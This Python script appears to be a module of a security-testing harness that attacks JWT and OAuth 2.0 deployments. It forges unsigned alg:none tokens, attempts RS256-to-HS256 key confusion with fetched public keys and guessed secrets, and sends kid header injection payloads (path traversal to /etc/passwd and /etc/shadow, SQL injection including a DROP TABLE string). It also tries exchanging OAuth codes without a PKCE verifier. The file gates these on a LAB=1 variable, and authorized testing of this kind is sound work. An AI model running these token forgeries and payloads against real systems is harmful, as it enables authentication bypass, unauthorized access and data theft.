#!/usr/bin/env python3
# HARNESS-VALIDATION v3.0.0 — Cross-sector: JWT/OAuth 2.0 security probe.
# Applies to every sector exposing REST APIs (banking, health, energy,
# telecom, crypto, IT). Tests the most common JWT/OAuth misconfigurations
# observed in real engagements:
#   - alg:none unsigned JWT acceptance        (CVE-2015-9235 family)
#   - RS256 → HS256 algorithm confusion       (public key as HMAC secret)
#   - kid header injection (path traversal / SQLi)
#   - OAuth 2.0 endpoint discovery            (/.well-known/openid-configuration)
#   - PKCE code_verifier bypass               (RFC 7636)
#   - Expired-token enforcement               (exp claim)
#
# Lab scope only (LAB=1 guard). Timeouts hard-capped at 5s per request.
# Graceful degradation: works with only `requests` + stdlib; if PyJWT is
# missing, JWTs are forged with base64 + HMAC manually.
#
# Usage:
#   LAB=1 python3 jwt_oauth_module.py <target_url> [jwt_token]
#   LAB=1 python3 jwt_oauth_module.py http://127.0.0.1:8080/api/profile \
#        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.sig
import base64
import hashlib
import hmac
import json
import os
import sys
import time
import warnings
from typing import Any, Dict, List, Optional, Tuple

# Suppress PyJWT InsecureKeyLengthWarning — we are deliberately forging
# tokens with short/known secrets in a lab; the warning is irrelevant noise
# on stdout/stderr and would corrupt the JSON-only stdout contract.
warnings.filterwarnings("ignore")

# ─── Optional deps (graceful degradation) ────────────────────────────
try:
    import requests
    _HAS_REQUESTS = True
except ImportError:                              # pragma: no cover
    requests = None                              # type: ignore
    _HAS_REQUESTS = False

try:
    import jwt as pyjwt                          # PyJWT
    _HAS_PYJWT = True
except ImportError:                              # pragma: no cover
    pyjwt = None                                 # type: ignore
    _HAS_PYJWT = False

# ─── Constants ───────────────────────────────────────────────────────
HARNESS_VERSION = "3.0.0"
MODULE_NAME = "jwt_oauth_probe"
REQUEST_TIMEOUT = 5                              # seconds, hard cap
USER_AGENT = f"harness/{HARNESS_VERSION} (jwt_oauth_probe)"

# OAuth/OIDC endpoints to probe (relative to the target's origin).
OAUTH_ENDPOINTS = (
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/token",
    "/oauth/authorize",
    "/oauth/revoke",
    "/oauth/introspect",
    "/userinfo",
)

# Known malicious / risky `kid` values used in real engagements.
KID_INJECTION_PAYLOADS = (
    "../../etc/passwd",
    "../../../../etc/shadow",
    "' OR '1'='1",
    "'; DROP TABLE keys; --",
    "key1' UNION SELECT 1--",
)

# Built-in HS256 secret candidates used when forging confusion/none tokens
# when the legitimate secret is unknown. Real engagements would extend this.
HS256_SECRET_GUESSES = (
    "secret", "your-256-bit-secret", "your_secret_key", "changeme",
    "password", "jwt_secret", "default", "supersecret",
)


# ─── LAB guard ──────────────────────────────────────────────────────
def lab_guard() -> bool:
    """Refuse to run unless LAB=1 is set in the environment."""
    return os.environ.get("LAB") == "1"


# ─── CLI args ────────────────────────────────────────────────────────
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/api/me"
JWT_TOKEN  = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("JWT_TOKEN", "")


# ─── Base64URL helpers (no external dep) ─────────────────────────────
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(segment: str) -> bytes:
    pad = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + pad)


# ─── HTTP helper ─────────────────────────────────────────────────────
def http_get(url: str, token: Optional[str] = None,
             extra_headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """GET with 5s timeout. Returns dict with status/len/ms/error."""
    if not _HAS_REQUESTS:
        return {"status": None, "len": 0, "ms": 0.0, "error": "requests_missing"}
    headers = {"User-Agent": USER_AGENT, "Accept": "application/json,text/plain;q=0.9,*/*;q=0.1"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if extra_headers:
        headers.update(extra_headers)
    t0 = time.time()
    try:
        r = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT,
                         allow_redirects=False)
        return {
            "status": r.status_code,
            "len": len(r.content),
            "ms": round((time.time() - t0) * 1000, 1),
            "body": r.text[:4096],
            "error": None,
        }
    except requests.RequestException as e:
        return {"status": None, "len": 0, "ms": round((time.time() - t0) * 1000, 1),
                "body": "", "error": type(e).__name__}


# ─── JWT decoding & forging ──────────────────────────────────────────
def decode_jwt_header_payload(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], bool]:
    """Decode a JWT WITHOUT verification — purely to inspect header & payload.

    Returns (header, payload, decoded_ok).
    """
    token = (token or "").strip()
    # Accept "Bearer xyz" form
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) < 2:
        return {}, {}, False
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        header = {}
    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        payload = {}
    decoded_ok = bool(header or payload)
    return header, payload, decoded_ok


def forge_jwt(header: Dict[str, Any], payload: Dict[str, Any],
              hmac_secret: Optional[str] = None) -> str:
    """Forge a JWT with a custom header/payload.

    - alg=none        → no signature (empty)
    - alg=HS256/HS384/HS512 → HMAC-SHA over header.payload using `hmac_secret`
    - any other alg   → empty signature (we cannot sign with RS256 here
      without a private key — caller treats it as unsigned/best-effort)
    """
    if _HAS_PYJWT:
        alg = header.get("alg", "none")
        if alg.lower() == "none":
            try:
                # PyJWT >= 2.x forbids alg=none via encode(); craft manually.
                seg_h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
                seg_p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
                return f"{seg_h}.{seg_p}."
            except Exception:
                pass
        else:
            try:
                key = (hmac_secret or "").encode() if alg.upper().startswith("HS") else b""
                return pyjwt.encode(payload, key, algorithm=alg, headers=header)
            except Exception:
                pass

    # Manual fallback (always works without PyJWT).
    seg_h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    seg_p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{seg_h}.{seg_p}".encode()
    alg = (header.get("alg") or "none").upper()
    if alg.startswith("HS"):
        digest = {"HS256": hashlib.sha256,
                  "HS384": hashlib.sha384,
                  "HS512": hashlib.sha512}[alg]
        mac = hmac.new((hmac_secret or "").encode(), signing_input, digest).digest()
        seg_s = b64url_encode(mac)
    else:
        # alg=none or unsupported — no signature
        seg_s = ""
    return f"{seg_h}.{seg_p}.{seg_s}"


# ─── JWT tests ───────────────────────────────────────────────────────
def _target_origin() -> str:
    """Return scheme://host:port of TARGET_URL (strip the path)."""
    from urllib.parse import urlsplit
    p = urlsplit(TARGET_URL)
    if not p.scheme or not p.netloc:
        return TARGET_URL
    return f"{p.scheme}://{p.netloc}"


def _forge_payload_from_token() -> Dict[str, Any]:
    """Copy payload from supplied JWT (or use a benign default)."""
    _, payload, decoded = decode_jwt_header_payload(JWT_TOKEN)
    if decoded and payload:
        # Make a benign copy (we are NOT the legitimate subject).
        return payload
    return {"sub": "harness-probe", "role": "guest", "iat": int(time.time()),
            "exp": int(time.time()) + 3600}


def test_alg_none() -> bool:
    """Forge a JWT with alg:none → check if server accepts unsigned token."""
    payload = _forge_payload_from_token()
    forged = forge_jwt({"alg": "none", "typ": "JWT"}, payload)
    r = http_get(TARGET_URL, token=forged)
    # Accepted heuristic: 2xx with no auth error string in body.
    body_lower = (r.get("body") or "").lower()
    auth_err = any(s in body_lower for s in ("unauthor", "invalid token", "no auth",
                                             "missing token", "forbidden", "not allow"))
    return r["status"] is not None and 200 <= r["status"] < 300 and not auth_err


def test_algorithm_confusion() -> Tuple[bool, List[str]]:
    """If the real alg is RS256, try HS256 with the server's public key
    (or common secrets) as HMAC secret. Returns (any_accepted, secrets_tried).
    """
    header, payload, decoded = decode_jwt_header_payload(JWT_TOKEN)
    if not decoded:
        return False, []
    real_alg = (header.get("alg") or "").upper()
    tested: List[str] = []

    # Only relevant for asymmetric algorithms (RS256, RS384, RS512, ES256, ...).
    asymmetric_algs = {"RS256", "RS384", "RS512", "ES256", "ES384", "ES512",
                       "PS256", "PS384", "PS512", "EdDSA"}
    if real_alg not in asymmetric_algs:
        return False, tested

    # Try to fetch a JWKS / public key from the OIDC config first.
    candidate_keys: List[str] = list(HS256_SECRET_GUESSES)
    try:
        oidc = http_get(f"{_target_origin()}/.well-known/openid-configuration")
        if oidc["status"] and 200 <= oidc["status"] < 300 and oidc.get("body"):
            cfg = json.loads(oidc["body"])
            jwks_uri = cfg.get("jwks_uri")
            if jwks_uri:
                jwks = http_get(jwks_uri)
                if jwks["status"] and 200 <= jwks["status"] < 300 and jwks.get("body"):
                    jcfg = json.loads(jwks["body"])
                    for k in jcfg.get("keys", []):
                        # The classic confusion: use the RSA public key (n+e
                        # PEM form) as the HMAC secret. We approximate by
                        # using the raw 'n' field as the secret.
                        if "n" in k:
                            candidate_keys.append(k["n"])
                        # PEM-encoded x5c[0] if present.
                        x5c = k.get("x5c") or []
                        if x5c:
                            candidate_keys.append(x5c[0])
    except Exception:
        pass

    accepted = False
    for secret in candidate_keys:
        tested.append(secret[:32])
        try:
            forged = forge_jwt({"alg": "HS256", "typ": "JWT"}, payload,
                               hmac_secret=secret)
        except Exception:
            continue
        r = http_get(TARGET_URL, token=forged)
        body_lower = (r.get("body") or "").lower()
        auth_err = any(s in body_lower for s in ("unauthor", "invalid token",
                                                  "no auth", "missing token",
                                                  "forbidden", "not allow",
                                                  "invalid algorithm", "alg"))
        if r["status"] is not None and 200 <= r["status"] < 300 and not auth_err:
            accepted = True
            break
    return accepted, tested


def test_key_id_injection() -> List[Dict[str, Any]]:
    """Forge JWTs with malicious `kid` header values (path traversal / SQLi)."""
    header, payload, decoded = decode_jwt_header_payload(JWT_TOKEN)
    results: List[Dict[str, Any]] = []
    if not decoded:
        return results
    base_header = {"alg": header.get("alg", "HS256"), "typ": "JWT"}
    for kid in KID_INJECTION_PAYLOADS:
        h = dict(base_header)
        h["kid"] = kid
        try:
            # If real alg is HS256 we don't know the secret — sign with a
            # guess so the server reaches the kid lookup. Best-effort.
            forged = forge_jwt(h, payload, hmac_secret="secret")
        except Exception as e:
            results.append({"kid": kid, "error": f"{type(e).__name__}: {e}"})
            continue
        r = http_get(TARGET_URL, token=forged)
        body_lower = (r.get("body") or "").lower()
        # Indicators that the kid was actually used by the server:
        #   - file contents leak (root:x:0: for /etc/passwd)
        #   - SQL error in body (sql, sqlite, syntax, mysql)
        leak = (("root:x:0:" in (r.get("body") or "")) or
                any(s in body_lower for s in ("sql", "sqlite", "syntax",
                                              "mysql", "ora-", "postgresql")))
        accepted_2xx = r["status"] is not None and 200 <= r["status"] < 300
        results.append({
            "kid": kid,
            "status": r["status"],
            "len": r["len"],
            "error": r["error"],
            "leak_indicator": leak,
            "accepted_2xx": accepted_2xx,
        })
    return results


def check_oauth_endpoints() -> List[Dict[str, Any]]:
    """Probe common OAuth/OIDC endpoints relative to the target's origin."""
    origin = _target_origin()
    found: List[Dict[str, Any]] = []
    for ep in OAUTH_ENDPOINTS:
        r = http_get(f"{origin}{ep}")
        # An endpoint is "found" if it returns anything other than 404/405.
        found_flag = (r["status"] is not None and r["status"] not in (404, 405, 501))
        # Try to extract grant_types / issuer from OIDC config.
        meta: Dict[str, Any] = {}
        if found_flag and "openid-configuration" in ep and r.get("body"):
            try:
                cfg = json.loads(r["body"])
                meta = {
                    "issuer": cfg.get("issuer"),
                    "grant_types": cfg.get("grant_types_supported"),
                    "pkce_supported": "S256" in (cfg.get("code_challenge_methods_supported") or []),
                    "jwks_uri": cfg.get("jwks_uri"),
                }
            except Exception:
                meta = {"parse_error": True}
        found.append({
            "endpoint": ep,
            "url": f"{origin}{ep}",
            "status": r["status"],
            "len": r["len"],
            "found": found_flag,
            "error": r["error"],
            "meta": meta,
        })
    return found


def test_pkce_bypass() -> Tuple[bool, Dict[str, Any]]:
    """If PKCE is supported by the authorization server, try exchanging an
    authorization code WITHOUT the code_verifier. The grant should be denied
    if PKCE is enforced.

    Returns (pkce_required, detail).
    """
    detail: Dict[str, Any] = {"tested": False}
    # Locate the token endpoint.
    origin = _target_origin()
    token_ep = f"{origin}/oauth/token"
    pkce_supported = False
    try:
        oidc = http_get(f"{origin}/.well-known/openid-configuration")
        if oidc["status"] and 200 <= oidc["status"] < 300 and oidc.get("body"):
            cfg = json.loads(oidc["body"])
            if cfg.get("token_endpoint"):
                token_ep = cfg["token_endpoint"]
            methods = cfg.get("code_challenge_methods_supported") or []
            pkce_supported = "S256" in methods or "plain" in methods
            detail["oidc_pkce_methods"] = methods
    except Exception as e:
        detail["oidc_error"] = f"{type(e).__name__}: {e}"

    detail["tested"] = True
    detail["pkce_supported"] = pkce_supported
    if not pkce_supported:
        # No PKCE support declared → cannot bypass-test; PKCE is *required*
        # for security but absent here, so we report `pkce_required=False`.
        return False, detail

    # Submit a fake code exchange WITHOUT code_verifier and observe the
    # response. A PKCE-enforcing server should reject (400/401).
    if not _HAS_REQUESTS:
        return True, detail
    headers = {"User-Agent": USER_AGENT,
               "Content-Type": "application/x-www-form-urlencoded",
               "Accept": "application/json"}
    data = ("grant_type=authorization_code"
            "&code=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            "&redirect_uri=http://127.0.0.1:8080/cb"
            "&client_id=harness-probe")
    # NB: deliberately omit code_verifier.
    t0 = time.time()
    try:
        r = requests.post(token_ep, headers=headers, data=data,
                          timeout=REQUEST_TIMEOUT, allow_redirects=False)
        ms = round((time.time() - t0) * 1000, 1)
    except requests.RequestException as e:
        detail["token_request_error"] = type(e).__name__
        return True, detail
    body_lower = r.text.lower()
    rejected = (r.status_code in (400, 401, 403) or
                any(s in body_lower for s in ("code_verifier", "pkce",
                                                "invalid_grant", "verifier")))
    detail["token_status"] = r.status_code
    detail["token_len"] = len(r.content)
    detail["token_ms"] = ms
    detail["rejected_without_verifier"] = rejected
    # PKCE is "required" only if the server actually rejects the missing verifier.
    return rejected, detail


def check_token_expiry_enforcement() -> bool:
    """Forge a JWT with `exp` set to the past → check if server rejects it."""
    _, payload, decoded = decode_jwt_header_payload(JWT_TOKEN)
    if not decoded:
        # If no JWT supplied, craft a benign one with HS256 + guessed secret.
        payload = {"sub": "harness-probe", "iat": int(time.time()) - 7200}
        header = {"alg": "HS256", "typ": "JWT"}
        secret = "secret"
    else:
        header = {"alg": "HS256", "typ": "JWT"}
        secret = "secret"
    expired_payload = dict(payload)
    expired_payload["exp"] = int(time.time()) - 3600   # 1 hour in the past
    try:
        forged = forge_jwt(header, expired_payload, hmac_secret=secret)
    except Exception:
        return False
    r = http_get(TARGET_URL, token=forged)
    body_lower = (r.get("body") or "").lower()
    rejected = (r["status"] in (401, 403) or
                any(s in body_lower for s in ("expir", "exp", "iat", "token expired",
                                                "not valid", "invalid token")))
    return bool(rejected)


# ─── Main ────────────────────────────────────────────────────────────
def main() -> None:
    if not lab_guard():
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "lab": False,
            "error": "LAB guard not satisfied",
            "detail": ("Set LAB=1 in the environment to confirm lab authorization. "
                       "JWT/OAuth probing forges authentication tokens and must NOT "
                       "run against production systems."),
            "legal_note": ("Forging JWTs against unauthorized systems is illegal "
                           "(e.g. Art. 323-1, 323-2 Code pénal FR)."),
        }, indent=2))
        sys.exit(1)

    # ── 1. Decode JWT (header + payload) without verification ──────
    header, payload, jwt_decoded = decode_jwt_header_payload(JWT_TOKEN)
    algorithm = header.get("alg") if jwt_decoded else None

    # ── 2. alg=none acceptance test ─────────────────────────────────
    try:
        alg_none_accepted = test_alg_none()
    except Exception as e:
        alg_none_accepted = False

    # ── 3. Algorithm confusion (RS256 → HS256 with public key) ──────
    try:
        alg_confusion_accepted, _tried = test_algorithm_confusion()
        alg_confusion_tested = {"tested": True, "accepted": alg_confusion_accepted}
    except Exception as e:
        alg_confusion_tested = {"tested": False, "error": f"{type(e).__name__}: {e}"}

    # ── 4. kid header injection ─────────────────────────────────────
    try:
        kid_results = test_key_id_injection()
        kid_injection = {
            "tested": bool(kid_results),
            "samples": kid_results[:5],
            "leak_or_accept": any(r.get("leak_indicator") or r.get("accepted_2xx")
                                  for r in kid_results),
        }
    except Exception as e:
        kid_injection = {"tested": False, "error": f"{type(e).__name__}: {e}"}

    # ── 5. OAuth/OIDC endpoint discovery ────────────────────────────
    try:
        oauth_eps = check_oauth_endpoints()
        oauth_endpoints_found = [e for e in oauth_eps if e["found"]]
    except Exception as e:
        oauth_endpoints_found = []
        oauth_eps = []
        kid_injection.setdefault("errors", []).append(f"oauth: {e}")

    # ── 6. PKCE bypass ──────────────────────────────────────────────
    try:
        pkce_required, pkce_detail = test_pkce_bypass()
    except Exception as e:
        pkce_required = False
        pkce_detail = {"error": f"{type(e).__name__}: {e}"}

    # ── 7. Expired-token enforcement ────────────────────────────────
    try:
        expiry_enforced = check_token_expiry_enforcement()
    except Exception:
        expiry_enforced = False

    report = {
        "module": MODULE_NAME,
        "harness_version": HARNESS_VERSION,
        "lab": True,
        "target": TARGET_URL,
        "jwt_provided": bool(JWT_TOKEN),
        "dependencies": {
            "requests": _HAS_REQUESTS,
            "pyjwt": _HAS_PYJWT,
        },
        "jwt_decoded": jwt_decoded,
        "algorithm": algorithm,
        "jwt_header": header if jwt_decoded else None,
        "jwt_payload_keys": list(payload.keys()) if jwt_decoded else [],
        "alg_none_accepted": alg_none_accepted,
        "alg_confusion_tested": alg_confusion_tested,
        "kid_injection": kid_injection,
        "oauth_endpoints_found": [
            {"endpoint": e["endpoint"], "status": e["status"],
             "pkce_supported": (e.get("meta") or {}).get("pkce_supported"),
             "issuer": (e.get("meta") or {}).get("issuer")}
            for e in oauth_endpoints_found
        ],
        "oauth_endpoints_detail": oauth_eps,
        "pkce_required": pkce_required,
        "pkce_detail": pkce_detail,
        "expiry_enforced": expiry_enforced,
        # High-level verdicts:
        "findings": {
            "critical_alg_none": alg_none_accepted,
            "critical_alg_confusion": bool(alg_confusion_tested.get("accepted")),
            "high_kid_injection": bool(kid_injection.get("leak_or_accept")),
            "high_expiry_not_enforced": not expiry_enforced,
            "medium_pkce_missing": not pkce_required,
        },
    }
    print(json.dumps(report, indent=2, default=str))


if __name__ == "__main__":
    main()
